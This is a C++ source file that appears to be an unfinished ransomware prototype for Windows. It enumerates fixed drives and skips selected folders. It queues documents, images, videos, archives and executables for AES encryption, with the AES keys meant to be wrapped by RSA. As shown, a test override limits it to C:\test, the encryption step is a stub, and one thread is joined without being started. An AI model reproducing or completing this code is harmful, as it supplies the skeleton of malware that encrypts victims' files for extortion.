
#include <cstdlib>
#include <iostream>
#include <vector>
#include <set>
#include <fstream>
#include <thread>
#include <future>
#include <chrono>

#include <boost\filesystem.hpp>

#include <windows.h>

#include "concurrentqueue.h"
#include "AESCrypto.h"
#include "RSACrypto.h"

using namespace std;
using namespace boost::filesystem;

struct p_producer_bundle {
	moodycamel::ConcurrentQueue<wstring>& q;
	moodycamel::ProducerToken& p;
	atomic<int>& flag;
};

struct k_producer_bundle {
	moodycamel::ConcurrentQueue<const unsigned char *>& q;
	moodycamel::ProducerToken& p;
	atomic<int>& flag;
};

struct p_consumer_bundle {
	moodycamel::ConcurrentQueue<wstring>& q;
	moodycamel::ProducerToken& p;
	atomic<int>& prod_flag;
	atomic<int>& cons_flag;
	const int& producer_count;
	const int& consumer_count;
};

struct k_consumer_bundle {
	moodycamel::ConcurrentQueue<const unsigned char *>& q;
	moodycamel::ProducerToken& p;
	atomic<int>& prod_flag;
	atomic<int>& cons_flag;
	const int& producer_count;
	const int& consumer_count;
};


set<wstring>* get_wanted_extentions();
set<wstring>* get_ignore_folders();
vector<wstring>* get_available_drives();

void path_producer(p_producer_bundle& bundle);
void path_consumer(p_consumer_bundle& c_bundle, k_producer_bundle&  p_bundle, const int& consumer_id);
void key_consumer(k_consumer_bundle& bundle, const int& consumer_id);

int main(int argc, char* argv[]) {
	moodycamel::ConcurrentQueue<wstring> path_queue;
	moodycamel::ProducerToken path_prod_tok(path_queue);
	moodycamel::ConcurrentQueue<const unsigned char *> key_queue;
	moodycamel::ProducerToken key_prod_tok(key_queue);

	const int path_producer_count = 1;
	const int path_consumer_count = 4;
	const int key_encrypter_count = 1;

	thread path_producer;
	thread path_consumers[path_consumer_count];
	thread rsa_thread;

	/* File path consumption pair */
	atomic<int> doneProducer(0);
	atomic<int> doneComsumer(0);

	/* AES key RSA encyption pair */
	atomic<int> doneProdEnc(0);
	atomic<int> doneConsEnc(0);
	RSACrypto rsa = RSACrypto();

	/* Start path producer thread and fill queue */
	p_producer_bundle path_producer_bundle = { path_queue, path_prod_tok, doneProducer };
	path_producer = thread(bind(&path_producer, ref(path_producer_bundle)));

	/* 
	Start path consumer thread and empty path queue 
	This thread also fills key_queue so we can encrypt aes keys with rsa
	*/
	p_consumer_bundle path_consumer_bundle = { path_queue, path_prod_tok, doneProducer, doneComsumer, path_producer_count, path_consumer_count };
	k_producer_bundle key_producer_bundle = { key_queue , key_prod_tok, doneProdEnc };
	for (int i = 0; i < path_consumer_count; ++i) {
		path_consumers[i] = thread(bind(&path_consumer, ref(path_consumer_bundle), ref(key_producer_bundle), i));
		//consumers[i] = async(launch::async, [&consumer_bundle, i]() {return consume(consumer_bundle, i);});	
	}



	/* Have all threads join */
	path_producer.join();
	for (int i = 0; i < path_consumer_count; ++i) {
		path_consumers[i].join();
	}
	rsa_thread.join();

	system("pause");
	return 0;
}

set<wstring>* get_wanted_extentions() {
	set<wstring>* extentions = new set<wstring>();
	// Text
	extentions->insert(L".pdf");
	extentions->insert(L".doc");
	extentions->insert(L".docx");
	extentions->insert(L".txt");
	extentions->insert(L".xls");
	extentions->insert(L".csv");
	// Images 
	extentions->insert(L".jpg");
	extentions->insert(L".jpeg");
	extentions->insert(L".png");
	extentions->insert(L".gif");
	// Video
	extentions->insert(L".webm");
	extentions->insert(L".mkv");
	extentions->insert(L".avi");
	extentions->insert(L".flv");
	extentions->insert(L".mp4");
	extentions->insert(L".wmv");
	extentions->insert(L".mpg");
	extentions->insert(L".mpeg");
	// Compressed
	extentions->insert(L".tar");
	extentions->insert(L".gz");
	extentions->insert(L".zip");
	extentions->insert(L".7z");
	extentions->insert(L".rar");
	// Executables
	extentions->insert(L".exe");
	extentions->insert(L".msi");
	extentions->insert(L".bin");
	extentions->insert(L".iso");

	return extentions;
}

vector<wstring>* get_available_drives() {

	vector<wstring>* drives = new vector<wstring>();

	WCHAR myDrives[512];
	UINT driveType;

	if (!GetLogicalDriveStringsW(ARRAYSIZE(myDrives) - 1, myDrives))
	{
		wprintf(L"GetLogicalDrives() failed with error code: %lu \n", GetLastError());
	}
	else
	{
		wprintf(L"This machine has the following logical drives: \n");

		for (LPWSTR drive = myDrives; *drive != 0; drive += 4)
		{
			driveType = GetDriveTypeW(drive);
			wprintf(L"Drive %s is type %d \n", drive, driveType);
			// Only deal with local drives
			if (driveType == DRIVE_FIXED) {
				wstring drive_string(drive);
				drives->push_back(drive_string);
			}
		}
	}

	return drives;
}


set<wstring>* get_ignore_folders() {
	set<wstring>* ignore_folders = new set<wstring>();

	ignore_folders->insert(L"boost_");
	ignore_folders->insert(L"OpenSSL");
	ignore_folders->insert(L"Perl");
	ignore_folders->insert(L"$");

	return ignore_folders;
}

void path_producer(p_producer_bundle& bundle) {
	set<wstring>* ignore_folders = get_ignore_folders();
	set<wstring>* wanted_extentions = get_wanted_extentions();
	vector<wstring>* drives = get_available_drives();

	moodycamel::ConcurrentQueue<wstring>& queue = bundle.q;
	moodycamel::ProducerToken& ptok = bundle.p;
	atomic<int>& flag = bundle.flag;

	// Testing
	drives = new vector<wstring>();
	drives->push_back(L"C:\\test");

	// Try searching for data on all drives
	for (wstring drive : *drives) {

		recursive_directory_iterator dir(drive), end;
		while (dir != end) {
			try
			{
				if (is_directory(dir->path())) {
					// Exclude certain paths 
					for (wstring partial_folder_name : *ignore_folders) {
						if (dir->path().wstring().find(partial_folder_name) != string::npos) {
							// Don't iterate further into folder
							dir.no_push();
							// cout << "Excluding -> " << dir->path() << endl;
							break;
						}
					}
				}

				if (is_regular_file(dir->path())) {
					// Only gather files with particular extentions
					if (wanted_extentions->find(dir->path().extension().wstring()) != wanted_extentions->end()) {
						wprintf(L"PRODUCER 1 - Queueing %s \n", &(dir->path().wstring())[0]);
						queue.enqueue(ptok, dir->path().wstring());
					}
				}

				++dir;
			}
			catch (const filesystem_error& ex)
			{
				cout << "PROBLEM PATH - " << dir->path() << endl;
				cout << ex.what() << '\n';
			}
		}
	}
	// Notify we are done producing
	flag.fetch_add(1, memory_order_release);
}

void path_consumer(p_consumer_bundle& p_bundle, k_producer_bundle& k_bundle, const int& consumer_id) {
	/* Unpack path consumer bundle */
	moodycamel::ConcurrentQueue<wstring>& p_queue = p_bundle.q;
	moodycamel::ProducerToken& p_ptok = p_bundle.p;
	atomic<int>& p_doneProducer = p_bundle.prod_flag;
	atomic<int>& p_doneConsumer = p_bundle.cons_flag;
	const int& p_producer_count = p_bundle.producer_count;
	const int& p_consumer_count = p_bundle.consumer_count;

	/* Unpack key producer bundle */
	moodycamel::ConcurrentQueue<const unsigned char *>& k_queue = k_bundle.q;
	moodycamel::ProducerToken& k_ptok = k_bundle.p;
	atomic<int>& k_doneProducer = k_bundle.flag;

	wstring path_str;
	bool items_left;
	do {
		items_left = p_doneProducer.load(memory_order_acquire) != p_producer_count;
		while (p_queue.try_dequeue_from_producer(p_ptok, path_str)) {
			items_left = true;
			wprintf(L"CONSUMER %d - Consuming %s \n", consumer_id, &path_str[0]);

			AESCrypto aes = AESCrypto();
		}
	} while (items_left || p_doneConsumer.fetch_add(1, memory_order_acq_rel) + 1 == p_consumer_count);
}